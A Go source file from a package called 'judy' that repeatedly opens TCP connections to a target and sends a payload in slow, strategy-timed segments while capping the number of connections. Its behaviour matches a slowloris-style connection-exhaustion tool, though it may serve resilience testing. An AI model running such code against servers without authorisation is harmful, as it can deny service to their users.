package judy

import (
	"fmt"
	"net"
	"time"

	log "github.com/sirupsen/logrus"
)

type defaultJudy struct {
	SStrat      SendStrategy
	MaxConns    int
	connections int
	done        bool
}

func (l *defaultJudy) Execute(conn net.Conn, prefix []byte, size int) chan bool {
	return l.executeOnConnection(conn, prefix, size)
}

func (l *defaultJudy) ExecuteContinuous(host string, port int, prefix []byte, size int) {
	target := fmt.Sprintf("%s:%d", host, port)

	go l.track()

	for !l.done {
		// TODO make configurable
		<-time.After(100 * time.Millisecond)

		if l.connections >= l.MaxConns {
			continue
		}

		logger.WithFields(log.Fields{
			"target": target,
		}).Trace("Establishing connection")
		conn, err := net.Dial("tcp", target)
		if err != nil {
			logger.WithFields(log.Fields{
				"target": target,
			}).Warn("Failed to establish connection")
		} else {
			logger.WithFields(log.Fields{
				"target": target,
				"local":  conn.LocalAddr().String(),
			}).Debug("Established connection")

			go func() {
				<-l.executeOnConnection(conn, prefix, size)
			}()
		}
	}
}

func (l *defaultJudy) Stop() {
	logger.Infof("Stop %v", l.done)
	l.done = true
	logger.Infof("Stoped %v", l.done)
}

func (l *defaultJudy) track() {
	for !l.done {
		logger.Infof("Managing %d connections", l.connections)
		time.Sleep(5 * time.Second)
	}
}

func (l *defaultJudy) executeOnConnection(conn net.Conn, prefix []byte, size int) chan bool {
	closed := make(chan bool)

	go l.send(conn, prefix, size, closed)

	return closed
}

func (l *defaultJudy) send(conn net.Conn, prefix []byte, size int, closed chan bool) {
	l.connections++

	defer func() {
		conn.Close()
		closed <- true
		l.connections--
	}()

	received := make(chan bool)
	go l.monitorConnection(conn, received)

	sendIndex := 0
	length := len(prefix) + size
	var segment []byte

	for sendIndex < length {
		select {
		case <-received:
			logger.WithFields(log.Fields{
				"sentBytes":      sendIndex,
				"remainingBytes": length - sendIndex,
				"remote":         conn.RemoteAddr().String(),
				"local":          conn.LocalAddr().String(),
			}).Warn("Received bytes on socket, ending")
			return
		case <-l.SStrat.Wait(sendIndex, length):
		}

		// Check if done here - the nature of this task means most time will be spent on the Wait method
		if l.done {
			logger.WithFields(log.Fields{
				"sentBytes":      sendIndex,
				"remainingBytes": length - sendIndex,
				"remote":         conn.RemoteAddr().String(),
				"local":          conn.LocalAddr().String(),
			}).Debug("Execution marked as done, returning")
			return
		}

		segment, sendIndex = l.SStrat.GetNextBytes(sendIndex, prefix, size)
		logger.WithFields(log.Fields{
			"segment":       string(segment),
			"payloadLength": length,
			"sendIndex":     sendIndex,
		}).Trace("Sending segment")

		if _, err := conn.Write(segment); err != nil {
			logger.WithFields(log.Fields{
				"segment":       segment,
				"payloadLength": length,
				"sendIndex":     sendIndex,
				"error":         err,
			}).Error("Failed while writing payload segment")
			return
		}
	}

	logger.Debug("Payload sent")
}

func (l defaultJudy) monitorConnection(conn net.Conn, done chan<- bool) {
	defer func() { done <- true }()

	read := make([]byte, 1)
	_, err := conn.Read(read)
	if err != nil {
		logger.WithFields(log.Fields{
			"error":  err,
			"remote": conn.RemoteAddr().String(),
			"local":  conn.LocalAddr().String(),
		}).Debug("Error while monitoring connection")
	} else {
		logger.WithFields(log.Fields{
			"remote": conn.RemoteAddr().String(),
			"local":  conn.LocalAddr().String(),
		}).Debug("Received data while monitoring connection")
	}
}
